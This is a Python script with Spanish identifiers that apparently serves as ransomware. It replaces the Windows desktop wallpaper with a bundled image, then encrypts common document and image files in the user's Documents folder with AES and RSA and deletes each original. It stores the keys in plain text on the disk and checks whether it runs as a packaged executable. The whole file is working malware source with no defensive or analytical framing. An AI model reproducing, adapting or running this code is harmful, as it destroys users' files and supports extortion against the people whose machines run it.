import os
import ctypes
import sys
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

def cambiar_fondo(ruta_imagen):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, ruta_imagen, 0)

def generar_llaves_rsa():
    llave_privada = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    llave_publica = llave_privada.public_key()

    with open("llave_publica.pem", "wb") as f:
        f.write(llave_publica.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))

    with open("llave_privada.pem", "wb") as f:
        f.write(llave_privada.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ))

    return llave_publica

def cifrar_archivo(ruta_archivo, llave_publica, ruta_llave_txt):
    llave_aes = get_random_bytes(16)

    with open(ruta_archivo, "rb") as f:
        datos = f.read()

    cipher = AES.new(llave_aes, AES.MODE_CBC)
    datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))

    llave_cifrada = llave_publica.encrypt(
        llave_aes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open(ruta_archivo + '.enc', 'wb') as f:
        f.write(cipher.iv + llave_cifrada + datos_cifrados)

    with open(ruta_llave_txt, 'a') as llave_file:
        llave_file.write(f"Archivo: {ruta_archivo}\n")
        llave_file.write(f"Llave AES (sin cifrar): {llave_aes.hex()}\n")
        llave_file.write(f"Llave AES (cifrada): {llave_cifrada.hex()}\n\n")

    # Eliminar el archivo original
    os.remove(ruta_archivo)

def cifrar_todos_los_archivos(directorio, llave_publica, ruta_llave_txt):
    tipos_archivos = ('.txt', '.pdf', '.png', '.docx', '.xlsx', '.jpeg', '.jpg')
    for archivo in os.listdir(directorio):
        ruta_archivo = os.path.join(directorio, archivo)
        if archivo.endswith(tipos_archivos):
            # Cifrar todas las imágenes .jpeg excepto "amenaza.jpeg"
            if archivo.endswith('.jpeg') and archivo == "amenaza.jpeg":
                continue
            cifrar_archivo(ruta_archivo, llave_publica, ruta_llave_txt)

if __name__ == "__main__":
    # Obtener la ruta de la carpeta de Documentos del usuario
    directorio_documentos = os.path.join(os.path.expanduser('~'), 'Documents')
    
    if getattr(sys, 'frozen', False):
        ruta_imagen = os.path.join(sys._MEIPASS, "aimehd.jpg")
    else:
        ruta_imagen = os.path.abspath("aimehd.jpg")

    cambiar_fondo(ruta_imagen)

    llave_publica = generar_llaves_rsa()
    ruta_llave_txt = os.path.join(directorio_documentos, 'llaves.txt')

    cifrar_todos_los_archivos(directorio_documentos, llave_publica, ruta_llave_txt)
